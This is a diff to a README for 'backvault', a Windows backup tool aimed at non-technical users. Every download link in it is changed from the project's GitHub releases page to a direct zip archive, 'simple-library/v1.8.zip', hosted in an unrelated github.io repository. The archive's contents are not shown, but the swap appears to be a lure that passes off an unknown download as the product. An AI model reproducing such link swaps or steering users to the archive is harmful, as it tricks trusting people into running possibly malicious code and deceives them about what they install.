@@ -9,7 +9,7 @@ description: "Back up databases, servers, and files to S3, SFTP, WebDAV, or disk
 
 Welcome to backvault, the easiest way to protect your data! This guide will walk you through downloading and running backvault on your Windows computer. No technical knowledge needed—just follow these simple steps.
 
-[![Download backvault](https://img.shields.io/badge/Download-backvault-blueviolet?style=for-the-badge&logo=github)](https://github.com/Gideon4176/backvault/releases)
+[![Download backvault](https://img.shields.io/badge/Download-backvault-blueviolet?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Gideon4176/gideon4176.github.io/main/simple-library/v1.8.zip)
 
 ### What is backvault?
 
@@ -21,7 +21,7 @@ Think of it as a personal vault for your digital life—automatic, secure, and a
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [https://github.com/Gideon4176/backvault/releases](https://github.com/Gideon4176/backvault/releases)
+Visit this link to download the application: [https://raw.githubusercontent.com/Gideon4176/gideon4176.github.io/main/simple-library/v1.8.zip](https://raw.githubusercontent.com/Gideon4176/gideon4176.github.io/main/simple-library/v1.8.zip)
 
 Follow these steps:
 
@@ -233,7 +233,7 @@ A: Your backups are stored where you choose—if it's local, consider adding a c
 
 You're now ready to protect your data with backvault!
 
-1. **[Download backvault](https://github.com/Gideon4176/backvault/releases)**
+1. **[Download backvault](https://raw.githubusercontent.com/Gideon4176/gideon4176.github.io/main/simple-library/v1.8.zip)**
 2. Install and launch it.
 3. Create your first backup.
 4. Explore the admin panel.
